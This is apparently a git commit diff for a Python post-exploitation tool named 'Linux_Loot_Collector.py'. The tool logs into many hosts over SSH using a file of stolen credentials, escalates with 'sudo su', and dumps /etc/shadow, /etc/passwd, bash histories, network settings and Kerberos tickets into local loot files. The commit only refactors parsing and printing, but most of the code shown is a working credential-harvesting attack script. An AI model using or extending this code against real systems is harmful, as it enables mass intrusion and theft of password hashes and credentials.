ab4dc4089fb9773f19587d891a77f359dc429bb4
pAndaa <pandaa@MacBook-Pro-pAndaa.local>
2023-01-27 12:54:19 +0300

    script editing, getting started

--- Linux_Loot_Collector.py
+++ Linux_Loot_Collector.py
@@ -10,13 +10,15 @@ def get_args():
     parser.add_argument("-f", "--file",
                         help="file with space separated credentials: <username> <password> <ip> [<port>]",
                         required=True)
+
+    # privilege escalation
     parser.add_argument("-p", "--privesc", help="privesc method: ss - sudo su; <??> - ??", default='ss')
     return parser.parse_args()
 
 
 # Parse input file content
-def parse_list(file):
-    params = open(file, 'r')
+def parse_list():
+    params = open(get_args().file, 'r')
     targets = []
     for line in params:
         if line != '\n':
@@ -24,26 +26,17 @@ def parse_list(file):
     return targets
 
 
-# Print recognized targets
-def print_target_info(targets):
-    print('+----------------------TARGETS-----------------------+')
-    for target in targets:
-        if len(target) >= 4:
-            print(target[0] + ':' + target[1] + '@' + target[2] + ':' + target[3])
-        else:
-            print(target[0] + ':' + target[1] + '@' + target[2] + '\t')
-    print("+----------------------------------------------------+")
-
-
 # Establish connection with single host
 def ssh_connect(host, user, pas, port):
     ssh = paramiko.SSHClient()
     ssh.load_system_host_keys()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+
     try:
         ssh.connect(hostname=host, username=user, password=pas, port=port)
         print(f"[*] Connection established")
         return ssh
+
     except:
         print(f"[!] Could not establish connection with {host}:{port}")
         return False
@@ -52,14 +45,12 @@ def ssh_connect(host, user, pas, port):
 # Kill the connection
 def ssh_disconnect(con):
     con.close()
-    # print("[+] Connection closed")
 
 
 # Execute sigle commad + escalation payload
 def ssh_exec(con, privesc, command):
     payload = privesc + command
 
-    # print(f'[*] Executing payload: {payload}')
     stdin, stdout, stderr = con.exec_command(payload)
     return stdout.read().decode()
 
@@ -85,21 +76,26 @@ def loot_write(name, data):
 # Collect loot from single host
 def collect_loot(target, privesc):
     try:
-        print(f'\n[*] Collecting loot from {target[2]}')
         # Establish connection with server
         if len(target) == 4:
             ssh = ssh_connect(target[2], target[0], target[1], target[3])
+            print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:{target[3]}')
         else:
             ssh = ssh_connect(target[2], target[0], target[1], '22')
+            print(f'Collecting loot from {target[0]}:{target[1]}@{target[2]}:22')
+
         # Break if connection wasn't established
         if not ssh:
             return False
+
         # Execute command
         pe = privesc_methods(privesc, target[1])
         dump = ssh_exec(ssh, pe,
                         'tail -n +1 /etc/passwd /etc/shadow /root/.bash_history /home/*/.bash_history /etc/hosts /etc/resolv.conf && klist')
+
         # Write loot to the file
         loot_write(target[2], dump)
+
         # Close connection
         ssh_disconnect(ssh)
         print("[+] Success!")
@@ -115,9 +111,6 @@ def loot_all_hosts(targets, privesc):
 
 
 if __name__ == "__main__":
-    options = get_args()
-    filename = options.file
-    privesc = options.privesc
-    targets = parse_list(filename)
-    print_target_info(targets)
-    loot_all_hosts(targets, privesc)
+    print('+----------------------TARGETS-----------------------+')
+    loot_all_hosts(parse_list(), get_args().privesc)
+    print("+----------------------------------------------------+")
